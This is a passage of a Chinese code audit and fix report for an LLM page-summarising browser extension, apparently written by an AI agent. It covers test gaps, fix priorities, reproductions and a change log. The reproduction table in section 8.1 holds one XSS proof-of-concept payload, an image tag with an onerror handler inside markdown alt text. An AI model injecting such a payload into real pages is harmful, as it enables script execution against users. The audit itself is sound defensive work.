| `lib/ai-sdk-connect-bridge.ts:135-178` 用法 | `allowSystemInMessages`、`toUIMessageStream({sendReasoning, messageMetadata, onError})` 的参数名与签名均正确；`totalUsage` 同步可用；finish 帧的 usage 结构与 `UsageDisplay.tsx` 读取字段吻合 |
| `token-count-bg.ts` 边界 | 四种裁剪策略主路径正确，`middle` 把标记自身 token 计入预算；真实分词器对 emoji/韩文/德语/数学字母逐 token 解码无 U+FFFD |
| 全仓 | 无遥测/分析外发；无 `sync:` 存储键；页面侧无 `window.postMessage` 监听或自定义事件通道；`enableAutoBeginSummary` 默认 false；`Mustache.escape` 关闭后输出只进 prompt、从不进 DOM；文本之外没有把页面正文落盘（快照只存 assistant、写 `storage.session`） |

---

## 5. 测试覆盖缺口

现有 15 个测试文件、139 个用例，质量不错（`model-settings-storage` 14 例、`migration` 12 例、`error-taxonomy` 13 例、`message` 18 例）。按风险排序的缺口：

| 模块 | 行数 | 现状 |
|---|---|---|
| `entrypoints/content/summary/useContentApp.ts` | 664 | **零测试**，总结主流程全在这里（F-13/F-14 及 3.1 多条静默失败都在其中）；eslint 配置注释自己就写着这个文件被 stale closure 坑过 |
| `entrypoints/background/ai-sdk-connect-bridge.ts` | 279 | 零测试。客户端 transport 测得很细，协议**服务端**（F-06/F-07/F-12 所在）完全没测 |
| `lib/prompt-settings-storage.ts` | 326 | 零测试，而结构几乎同款的 model 侧有 14 例；F-02/F-04 的 Prompt 分支无回归网 |
| `components/ai-elements/message.tsx` 的 image/link 分支 | — | 只有 citation 四个纯函数有测试（`test/components/message.test.ts`），**F-01 正落在覆盖不到的地方** |
| `lib/page-extraction.ts` 的 DOM 分支 | 364 | 只测了 `cleanExtractedText`；F-14 的三条分支与 3.0.1 新增的"首选失败换另一种"回退均无覆盖 |
| `entrypoints/background/cors-fix.ts` / `control.ts` | 201 / 146 | 零测试，`sortKeys`、规则形状、`isInjectionForbidden`、`resolveOptionsUrl` 都是可测纯逻辑 |
| 设置页（`ModelEditor.tsx` 741 等） | — | 零测试；F-02/3.1 多条的实际触发点 |
| `entrypoints/content/ContentEntrance.tsx` | 240 | 零测试；pageKey 切换 + 快照恢复 + 显式打开竞态只在 lib 层有覆盖（F-09 所在） |

若干断言偏弱，值得顺手加固：`test/lib/input-token-limit.test.ts:6,7,11,15` 用 `as never` 传部分对象（字段名写错照样绿）；`test/lib/model-provider.test.ts:4` 只覆盖 `buildBodyOverrides`，ollama 强转分支（F-03）0 覆盖；`test/lib/migration.test.ts:132` 用 `as any[]`；`test/lib/panel-snapshot.test.ts:96,98` 只有 `toBeDefined()`。另外 `test/mocks/imports.ts:12-20` 的 `storage` 是 no-op 桩（`getItem` 恒返回 null）且作为全局 alias —— 新测试若不显式 `vi.mock` 会"通过但没测到东西"。

---

## 6. 修复优先级建议

1. **F-01（XSS 兜底转义，一行）** —— 唯一的注入类缺陷，先修；同时订正 AGENTS.md 里那条"已核查"结论，并补一条回归测试。
2. **F-02（写回不再清除坏行 + 导入据实报数）**、**F-04（写操作串行化）** —— 同两个文件，建议一起做；这是唯一会永久丢用户数据（含 API Key）的问题。
3. **F-03（ollama 换 OpenAI 兼容端点，删掉强转）** —— 现状是该 provider 完全不可用，改动很小。
4. **F-05（迁移先写后删）**、**F-12（分词器失败清缓存）** —— 各几行，消除两类"一次意外就长期失效"。
5. **F-06（超时）+ F-07（空输出判失败）** —— 解决"无限转圈"和"空总结被当成成功"。
6. **F-08 + F-10（content 只取最小字段；不渲染模型图片）** —— 收掉密钥暴露面与一类外发面。
7. **F-11（sender 断言 + URL 白名单）**、**F-13/F-14（两处陈旧/空内容）**。
8. 3.4/3.5：删 `picomatch`、显式声明 `typescript`、两条 lint 规则提为 error、加最小 CI、重建 `.output` 并清理 `next/` 与 release 解压目录、把 `background.js` 的 2.6MB 词表问题查清。

---

## 7. 审查边界

- 只审 `main` @ `fbf4fa7` 的检出内容；未审 `reference/`（上游参考，被 `.gitignore`）、`next/`（废弃 v4 产物）、`release/` 内历史 zip 的内容（仅取 3.1.1 包做体积/清单核对）。
- **未做真机浏览器验证**：结论来自源码、配置、构建产物的静态分析，加上若干在 Node 里跑真实依赖的复现。以下三项必须真机确认后才能定级：① F-01 注入的内联处理器落在哪个 JS 世界（隔离世界 → 直达 `chrome.storage`，则升级为 critical）；② DNR 规则在 Chrome 里对 SW `fetch()` 的分类是否就是 `xmlhttprequest`（否则规则根本不生效）；③ `activeTab`/`scripting` 删除后的实际行为。
- 沙箱内无法运行 Vitest（见第 0 节），测试结果来自一次提权执行，未重复运行排查 flaky。
- `background.js` 为何把动态 chunk 折进入口，未定位到打包器配置层面的原因，需在真机构建后用产物图确认。

---

## 8. 复核与订正记录

### 8.1 主审独立复现（不是采信子审查）

| 结论 | 复现方式与结果 |
|---|---|
| F-01 图片 alt XSS | 用仓库内 `marked@18.0.4` + 照抄本项目 renderer 跑：`![<img src=x onerror=alert(1)>](javascript:alert(1))` → `<p><img src=x onerror=alert(1)></p>`；安全 URL 分支的 `alt` 转义正常 |
| F-03 ollama 必然失败 | 直接跑 `streamText({ model: createOllama(...).languageModel('llama3') })` → `specificationVersion = v1`，抛 `AI_UnsupportedModelVersionError` |
| F-07 空输出守卫不可达 | `node_modules/ai/dist/index.js` 中 `sendStart = true, sendFinish = true` 与无条件发射已确认 |
| F-12 分词器失败被缓存 | `token-count-bg.ts:40` 的 `??=` 在 `.then` 之前赋值，reject 后缓存即为已拒绝的 promise |
| background.js 2.6MB / 词表内联 | 读 `release/3.1.1` zip 条目：`background.js` = 2,708,596 字节，文本含 `cl100k_base`/`o200k_base`，`chunks/` 无 tokenizer chunk |
| `.output` 落后 | `.output/chrome-mv3/manifest.json` = `3.0.1`，目录内有 `kuai-kan-3.0.1-chrome.zip` |
| package-lock 三处版本 | 用 `ConvertFrom-Json -AsHashtable` 读（`"": {}` 会让默认解析报错，这也解释了 AGENTS.md 说的"容易漏"）：均为 `3.1.1` |
| `picomatch`/`zod` 未使用、`typescript` 幽灵依赖 | `git grep` 与 `npm ls typescript` 实测 |
| `saveGeneralSettings` 的 baseline 未生效 | 全仓唯一调用点 `GeneralPage.tsx:232` 未传 baseline |
| 面板不订阅 Prompt 键 | 全仓 4 处 `storage.watch` 均与 Prompt 键无关 |
| F-02 导入虚报成功 | 读 `ModelsListPage.tsx:111-120` 与 `model-transfer.ts:74-77`：过滤条件与落盘校验不一致，toast 用的是未再校验的 `merged.length` |
| F-09 Map 存全量消息 | 读 `ContentEntrance.tsx:119-122`（直接 `set(key, latest)`）与 `panel-snapshot.ts:54-56`（落盘才过滤） |
| F-14 空对象被当有效正文 | 读 `page-extraction.ts:372-411` 与 `useContentApp.ts:310-333,524-528` 的判定链 |
| `message.tsx:576` 的 `{...props}` 后置 | 读源码确认，当前唯一调用点不传该属性 → 降级为潜在陷阱 |
| `RightFloatingBallContainer` 改宿主 body class | 读 `:88`/`:124` + `entrypoints/content/index.ts:8` 的 `cssInjectionMode: 'ui'`，确认该 class 进不了页面作用域 |

### 8.2 被推翻或修正的子审查结论

| 子审查结论 | 复核结果 |
|---|---|
| 安全专项：「markdown 转义管线真的兜住了 XSS，未发现绕过，最高只剩三类 medium」 | **推翻**。该结论只核查了 html / link / codespan / citation 路径，漏了 `renderer.image` 第 99 行的 `return text` 兜底；主审用同一套代码复现出注入（见 F-01）。安全专项据此把 F1（密钥进 content）定为 medium 的前提也不再牢固——两条组合需要真机确认世界归属。 |
| 安全专项：「DNR 规则可被第三方页面滥用」 | **推翻为"未发现可利用路径"**。`initiatorDomains` 匹配请求发起者而非 URL，规则只覆盖扩展自身发起的 XHR。保留"范围过宽"的结论（3.3）。 |
| content 专项：「SPA 换路由后会把上一页正文存到新页快照」 | **推翻**。`ContentEntrance.tsx:202` 用 `key={pageKey}` 让框架在 pageKey 变化时重挂载，旧实例用旧 pageKey 落盘；新实例 `pageContent` 初始为 null，只会命中"没有正文"兜底。 |
| content 专项：「cite 占位符可注入可执行脚本」 | **采纳机制、否认可执行性**：DOM 会被撑坏（实测），但短语经 `escapeHtml`，未能构造出从短语注入 `"`/`on*` 的路径，降级为 3.6 的小瑕疵。 |
| 工程专项：「`activeTab` 权限可删」 | **降级为"很可能可删"**。代码层确无使用，但删权限属运行时行为变更，需真机确认。 |
| background 专项：「同一错误会发两帧」 | **采纳机制、降级为冗余**：带 status 的分类帧先到、`errorText` 那帧被客户端 `closed` 守卫丢弃，不影响正确性，未单列。 |
| background 专项：「negative maxTokens 可被外部触达」 | **降级为潜伏**：当前两个调用点都有 `> 0` 守卫，写入 3.2 供后续调用方参考。 |
| content 专项：「ping/extractText 未解绑会导致扩展重载后异常」 | **采纳代码事实、影响标注需验证**，写入 3.6。 |

---

## 9. 修复记录（本次全部改动）

修复已完成并全部通过闸门：`npm run compile` ✅ · `npm run lint` ✅（三条规则已提为 error）· `npm run test` ✅ **184 个用例 / 17 个文件**（修复前 139 / 15）。`.output/chrome-mv3` 已重建为 3.1.1。

### 9.1 逐条对应

| 编号 | 修复内容 | 关键改动点 |
|---|---|---|
| F-01 | 图片兜底分支改为 `escapeHtml(text)`；**模型输出不再渲染任何 `<img>`**（图片是外发面且无信息增量）；链接补 `target="_blank" rel="noopener noreferrer"`；`isSafeUrl` 在无 `window` 的测试环境也有确定的基准 | `components/ai-elements/message.tsx` |
| F-02 | 写回时把"认不出的行"原样保留（`splitModelRows` + `readPreservedRows`）；导入按**实际落盘数**报数、`rejected>0` 时给 warning、全部无法识别时整体拒绝；导出默认剔除 `apiKey`/`headers`（要带凭据需显式确认）；导入校验与落盘校验统一（`filterPersistableModelRows`），并顺手修好了"V1 老备份被当成非本扩展文件"的问题 | `lib/model-settings-storage.ts`、`lib/prompt-settings-storage.ts`、`lib/model-transfer.ts`、`entrypoints/options/pages/models/ModelsListPage.tsx` |
| F-03 | `providerId: 'ollama'` 改由 `createOpenAICompatible` 实现，`normalizeOllamaBaseURL` 把旧的 `.../api` 统一成 `.../v1`（读取时即改写）；`ollama-ai-provider` 依赖已移除 | `lib/model-provider.ts`、`constants/model-settings.ts`、`lib/model-settings-storage.ts` |
| F-04 | 模型/Prompt 的**所有**写操作改经后台 `mutateModelSettings` / `mutatePromptSettings`，在 `createQueue()` 里串行执行；8 个文件的 14 处调用点全部改造 | `lib/settings-mutations.ts`（新）、`entrypoints/background/settings-mutations-bg.ts`（新）、`lib/messaging.ts` 及各调用页 |
| F-05 | 迁移改为**先 `set`（含版本标记）再 `remove`**，清理失败只记日志（数据已安全） | `lib/migration.ts` |
| F-06 | 新增可测的空转看门狗 `createIdleWatchdog`（120s 无任何帧即中止并回一条"timed out"错误帧，分类器据此给出中文超时提示） | `lib/idle-timeout.ts`（新）、`entrypoints/background/ai-sdk-connect-bridge.ts` |
| F-07 | 空输出判定从"帧数"改为"内容帧"（`text-delta`/`reasoning-delta` 且 delta 非空），空响应不再被当成成功 | 同上 |
| F-08 | 面板只接收 `toPublicModelConfig()` 投影（去掉 `apiKey`/`headers`/`extraBody`），密钥不再进入 page 上下文；图标解析统一走 `resolveModelIconUrl()` | `constants/model-settings.ts`、`useContentApp.ts`、`ModelSelector.tsx`、`UsageDisplay.tsx`、`lib/model-icon.ts`（新） |
| F-09 | 内存快照同样只保留 assistant 消息（两条恢复路径语义一致） | `entrypoints/content/ContentEntrance.tsx` |
| F-10 | 同 F-01（不再渲染图片）；`referrerpolicy` 由"不请求外部图片"直接消除 | `message.tsx` |
| F-11 | 后台每个消息入口 + bridge 端口断言发送方是本扩展（`lib/background-trust.ts`）；`openOptionPage` 只接受 `/options.html…`，其余回落设置首页 | `entrypoints/background/*`、`lib/background-trust.ts`（新） |
| F-12 | 分词器加载失败时清空 promise 缓存，下一次调用会重试 | `entrypoints/background/token-count-bg.ts` |
| F-13 | 面板新增对 `PROMPT_CONFIG_STORAGE_KEY` 的订阅；当前提示词被删除时回落到默认/第一个 | `entrypoints/content/summary/useContentApp.ts` |
| F-14 | `domHeuristicParseRead` 无文本时返回 `undefined`；抽出可测的 `pickExtraction()`，两种策略都无正文时不再返回空对象；调用侧改判 `extracted?.textContent` | `lib/page-extraction.ts`、`useContentApp.ts` |
| 3.1 | 重启总结超时会提示而非静默返回；外部触发在"无正文/设置读取失败"时清标志并提示；默认项下拉处理失败与返回值；GeneralPage 回滚只回单个键 | `useContentApp.ts`、`GeneralPage.tsx`、`popup/App.tsx`、`lib/i18n.ts` |
| 3.2 | `getErrorMessage` 不再回传 HTML 正文（与其注释一致）；后台错误日志只留 `name/status/message`，不再把整页 prompt 打进控制台；truncate RPC 归一化 `maxTokens`（负数/小数/0 都不再产生反直觉结果）；`input-token-limit` 的 0.9 系数不再塌缩成"无上限"；404/`permission` 分类收窄并改写提示文案 | `ai-sdk-connect-bridge.ts`、`token-count-bg.ts`、`input-token-limit.ts`、`error-taxonomy.ts` |
| 3.3 | 权限去掉 `activeTab`/`scripting`（前者无使用者，后者的探针改用 `ping`，并新增受限 URL 预判以避免白等 2.3s）；`web_accessible_resources` 收窄为 `['icon/*','llm-icons/*']` + `use_dynamic_url`；删除零引用的 `public/wxt.svg` | `wxt.config.ts`、`control.ts`、`public/` |
| 3.4 | 移除未使用的 `picomatch`（站点定制的遗留）与 `ollama-ai-provider`；`private: true`；eslint ignores 补 `next/release`、三条规则提为 error；vitest include 改 `test/**/*.test.{ts,tsx}`；visualizer 改为 `ANALYZE=1` 才输出到 `.output/`；新增 CI workflow | `package.json`、`eslint.config.js`、`vitest.config.ts`、`wxt.config.ts`、`.github/workflows/quality.yml`（新） |
| 3.5 | `.output` 重建为 3.1.1 并清掉 3.0.1 旧 zip；删除 295.6MB 的 `next/`；`.gitignore` 补 `next/`、`.freebuff/`、release 校验副本目录；AGENTS.md 的发布流程补"确认 `.output` manifest 版本"一步 | `.output`、`.gitignore`、`AGENTS.md` |
| 3.6 | `{...props}` 前置（转义结果不可被调用方覆盖）；cite 占位符只在文本上下文替换（不再插进属性）；面板几何在 `window.resize` 时重校验并夹取尺寸；悬浮球改 Pointer Events + `setPointerCapture`（含 `pointercancel`），不再修改宿主 `<body>` 的 class；面板宿主被页面移除后自动重挂；`ping`/`extractText` 绑定 `ctx.onInvalidated`；`pageContent` 缓存条目清理无用字段；播种不再重复读同一键 | `message.tsx`、`PanelContainer.tsx`、`RightFloatingBallContainer.tsx`、`scope.tsx`、`page-content-cache.ts`、`prompt-settings-storage.ts` |

### 9.2 回归测试与加固

新增/加强的用例（+45，139 → 184）：

- `test/components/message.test.ts`：新增 7 条针对**真实 renderer** 的用例（图片 alt 注入回归、任意图片都不渲染、原始 HTML 转义、`javascript:` 链接、citation chip 渲染），并把"占位符落在标签属性里"钉住。
- `test/lib/idle-timeout.test.ts`（新，6 条）：看门狗只在静默满时才触发、每次 reset 重开、只触发一次、dispose 后不再触发。
- `test/lib/model-settings-storage.test.ts`：新增"unparsed 行在编辑/删除后仍在"、"导入会保留认不出的行并据实报 rejected"、"全部无法识别时拒绝写入且不动原数据"、"旧的 ollama `/api` 在读取时改写为 `/v1`"。
- `test/lib/prompt-settings-storage.test.ts`（新，5 条）：该文件此前零测试。
- `test/lib/model-transfer.test.ts`：导出默认脱敏/显式包含凭据、V1 老备份可导入、存储层会拒绝的行不再被算作"已导入"。
- `test/lib/migration.test.ts`：新增"清理失败也不丢已恢复的数据"（配套给 `wxt-browser` mock 加了 `__failNextStorageRemove()`）。
- `test/constants/model-settings.test.ts`、`test/lib/model-provider.test.ts`、`test/lib/page-extraction.test.ts`、`test/lib/error-taxonomy.test.ts`、`test/background/token-count-bg.test.ts`、`test/lib/input-token-limit.test.ts`：覆盖 ollama 分支与 base URL 归一化、空提取、404/permission 分类收窄、负数/0/小数预算、0.9 系数不塌缩。
- 顺手加固弱断言：`input-token-limit.test.ts` 的 `as never` 改为按真实契约构造对象、`migration.test.ts` 的 `as any[]` 改为具体类型、`panel-snapshot.test.ts` 的 `toBeDefined()` 改为完整对象断言。

### 9.3 未修（附原因）

| 项 | 现状与原因 |
|---|---|
| `background.js` 2.6MB（词表内联） | 已定位：`gpt-tokenizer/model/gpt-5` 只导入 `o200k_base`（2.22MB），打包器把它内联进入口，没有独立 chunk。**这 2.57MB 就是精确分词所需的词表本身**，不是可删的冗余。真要变小只有两条路：换近似分词器（牺牲计数准确性）或把计数挪到 offscreen document（架构改动）。两者都需要你定方向，我没有替你选。已把测量结果与选项写进 AGENTS.md |
| F-01 的爆炸半径（注入落在哪个 JS 世界） | 需要真机 PoC：在页面的 ShadowRoot 里用 `innerHTML` 注入 `onerror`，看它能否访问 `chrome.storage`。**修复本身不依赖这个结论**（已按注入缺陷修掉） |
| react-router 的 10 条 audit 告警 | 官方 No fix available；命中的是 SSR/RSC/`deserializeErrors` 等本扩展不使用的路径，开放重定向需要用户可控的跳转目标而本扩展只跳字面路由。已记入 AGENTS.md 待升级时复评 |
| `useContentApp.ts` / `ai-sdk-connect-bridge.ts` 仍无集成测试 | 两者都需要 jsdom/happy-dom 或一个假模型 + 假端口的测试骨架；本轮为它们抽出了可测的纯逻辑（`pickExtraction`、`createIdleWatchdog`）并已覆盖，但端到端行为仍靠手工验证 |
| 卡片式 UI / 拖拽缩放的运行时行为 | 静态审查无法验证，需真机点一遍（尤其是改过的悬浮球拖拽、面板 resize 回落、图标在 `use_dynamic_url` 下的显示） |
